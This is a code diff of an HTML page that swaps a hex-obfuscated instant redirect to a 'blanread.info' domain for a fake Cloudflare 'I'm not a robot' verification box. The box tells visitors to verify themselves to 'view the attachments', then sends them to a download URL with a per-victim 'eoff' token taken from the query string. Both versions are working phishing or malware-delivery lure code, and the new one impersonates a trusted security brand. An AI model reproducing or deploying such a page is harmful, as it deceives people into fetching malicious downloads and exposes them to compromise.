@@ -1,32 +1,242 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting…</title>
-    <!-- immediate redirection to obfuscated target -->
-    <script>
-        (function() {
-            // obfuscated target: hex encoded "https://news.blanread.info/go"
-            var hex = '68747470733a2f2f6e6577732e626c616e726561642e696e666f2f676f';
-            function hexToStr(h) {
-                var out = '';
-                for (var i = 0; i < h.length; i += 2) {
-                    out += String.fromCharCode(parseInt(h.substr(i, 2), 16));
-                }
-                return out;
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <title>Safety Check</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #f8fafc;
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            overflow: hidden;
+        }
+
+        /* -------- MAIN UI -------- */
+        .verification-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 1; /* instantly visible */
+            transition: none;
+        }
+
+        .instruction-text {
+            margin-bottom: 18px;
+            font-size: 0.92rem;
+            color: #1e293b;
+            letter-spacing: -0.01em;
+            font-weight: 450;
+            text-align: center;
+        }
+
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 340px;
+            height: 100px;
+            padding: 0 24px;
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            position: relative;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .captcha-box:hover {
+            border-color: #94a3b8;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.06);
+        }
+
+        .captcha-box:active {
+            transform: scale(0.97);
+        }
+
+        .click-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .svg-holder {
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .svg-shape {
+            width: 100%;
+            height: 100%;
+            fill: none;
+            stroke: #cbd5e1;
+            stroke-width: 2.5;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            transition: stroke 0.3s ease;
+        }
+
+        .btn-label {
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: #1e293b;
+            transition: color 0.3s ease;
+        }
+
+        .brand-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            justify-content: center;
+            height: 100%;
+        }
+
+        .brand-logo {
+            height: 38px;
+            width: auto;
+            margin-bottom: -2px;
+            display: block;
+        }
+
+        .brand-name {
+            display: block;
+            font-weight: 800;
+            font-size: 0.75rem;
+            letter-spacing: 1.5px;
+            color: #FF8C00;
+            text-transform: uppercase;
+        }
+
+        .legal-note {
+            font-size: 0.65rem;
+            color: #64748b;
+            margin-top: 1px;
+        }
+
+        .captcha-box.spin-mode .svg-shape {
+            stroke: #3b82f6;
+            animation: spin 1s linear infinite;
+            transform-origin: center;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
             }
-            var url = hexToStr(hex);
-            window.location.replace(url);
-        })();
-    </script>
-    <!-- fallback for no JavaScript -->
-    <noscript>
-        <meta http-equiv="refresh" content="0; url=https://news.blanread.info/go">
-    </noscript>
+        }
+
+        .captcha-box.spin-mode .btn-label {
+            color: #3b82f6;
+        }
+    </style>
 </head>
 <body>
-    <!-- minimal visual feedback; redirect is nearly instantaneous -->
-    <p style="font-family:sans-serif;text-align:center;margin-top:20vh;color:#555;">Redirecting…</p>
+
+    <!-- MAIN UI (no loader) -->
+    <div id="mainUi" class="verification-container">
+        <div id="instr" class="instruction-text"></div>
+        <div id="captchaWidget" class="captcha-box">
+            <div class="click-area">
+                <div class="svg-holder">
+                    <svg viewBox="0 0 24 24" class="svg-shape">
+                        <path id="svgPath" d="M4 4h16v16H4z" />
+                    </svg>
+                </div>
+                <span id="dynamicLabel" class="btn-label"></span>
+            </div>
+            <div class="brand-wrapper">
+                <img src="cloudflare_.png" alt="secure" class="brand-logo" />
+                <span id="brandingText" class="brand-name"></span>
+                <div class="legal-note">privacy . terms</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const WORDS = {
+                hint: "Verify you're human below to view the attachments",
+                start: "I'm not a robot",
+                verifying: "Verifying...",
+                company: "CLOUDFLARE"
+            };
+
+            const mainPanel = document.getElementById('mainUi');
+            const instrBox = document.getElementById('instr');
+            const captchaCard = document.getElementById('captchaWidget');
+            const labelSpan = document.getElementById('dynamicLabel');
+            const brandSpanEl = document.getElementById('brandingText');
+            const svgPath = document.getElementById('svgPath');
+
+            instrBox.textContent = WORDS.hint;
+            labelSpan.textContent = WORDS.start;
+            brandSpanEl.textContent = WORDS.company;
+
+            let busy = false;
+
+            // Extract eoff fragment from URL
+            function getEoff() {
+                const q = window.location.search;
+                const idx = q.indexOf('eoff=');
+                if (idx === -1) return '';
+                const start = idx + 5;
+                let end = q.length;
+                const amp = q.indexOf('&', start);
+                const hash = q.indexOf('#', start);
+                if (amp !== -1) end = Math.min(end, amp);
+                if (hash !== -1) end = Math.min(end, hash);
+                return q.substring(start, end);
+            }
+
+            // Change SVG to spinner (optional, but keeps visual feedback)
+            function setSpinnerPath() {
+                svgPath.setAttribute('d', 'M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2');
+                svgPath.style.strokeDasharray = '35 15';
+            }
+
+            function handleVerify(e) {
+                if (busy) return;
+                busy = true;
+
+                captchaCard.style.cursor = 'default';
+                captchaCard.classList.add('spin-mode');
+                labelSpan.textContent = WORDS.verifying;
+                setSpinnerPath();
+
+                // Slight press feedback
+                captchaCard.style.transform = 'scale(0.97)';
+                setTimeout(() => {
+                    captchaCard.style.transform = '';
+                }, 150);
+
+                // Build target URL
+                const base = 'https://download.blanread.info/go';
+                const eoff = getEoff();
+                const target = eoff ? base + '#' + eoff : base;
+
+                // Immediate redirect – no artificial delay
+                window.location.href = target;
+            }
+
+            captchaCard.addEventListener('click', handleVerify);
+        })();
+    </script>
 </body>
 </html>
